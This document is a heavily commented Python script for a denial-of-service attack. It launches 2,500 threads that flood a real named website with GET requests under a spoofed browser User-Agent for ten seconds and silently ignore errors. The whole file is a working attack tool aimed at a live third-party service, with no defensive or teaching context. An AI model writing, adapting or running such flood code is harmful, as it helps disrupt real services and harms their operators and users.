# Importing the threading module which allows the program to run multiple threads (smaller units of a process) at once.
import threading

# Importing the requests module which is used to make HTTP requests.
import requests

# Defining a class named DDoSThread that inherits from threading.Thread.
class DDoSThread(threading.Thread):
    # Initialization method for the DDoSThread class.
    def __init__(self, url, param):
        # Calling the initialization method of the parent class.
        super().__init__()
        # Storing the URL to be attacked.
        self.url = url
        # Storing the parameters to be sent with the request.
        self.param = param
        # Flag to control the running state of the thread.
        self.running = True

    # Method that defines the behavior of the thread.
    def run(self):
        # Loop that continues as long as the running flag is True.
        while self.running:
            try:
                # Attempting to perform the attack.
                self.attack()
            except Exception as e:
                # Ignoring any exceptions that occur during the attack.
                pass

    # Method that performs the attack.
    def attack(self):
        # Defining headers to be sent with the request.
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW6; rv: 8.0) Gecko/20100101 Firefox/8.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }

        # Sending a GET request to the specified URL with headers and parameters.
        response = requests.get(self.url, headers=headers, params=self.param)
        # Printing the thread and the status code of the response.
        print(f"{self} {response.status_code}")

# Main block of the script.
if __name__ == "__main__":
    # URL to be attacked.
    url = "https://libgen.is/"
    # Parameters to be sent with the request.
    param = {'param1': '87845'}

    # List to store the thread objects.
    threads = []
    # Loop to create and start 2500 threads.
    for i in range(2500):
        # Creating a new thread object.
        thread = DDoSThread(url, param)
        # Starting the thread.
        thread.start()
        # Adding the thread to the list of threads.
        threads.append(thread)

    # Importing the time module to add a delay.
    import time
    # Pausing the program for 10 seconds.
    time.sleep(10)

    # Loop to stop all threads.
    for thread in threads:
        # Setting the running flag of the thread to False to stop it.
        thread.running = False
        # Waiting for the thread to finish.
        thread.join()

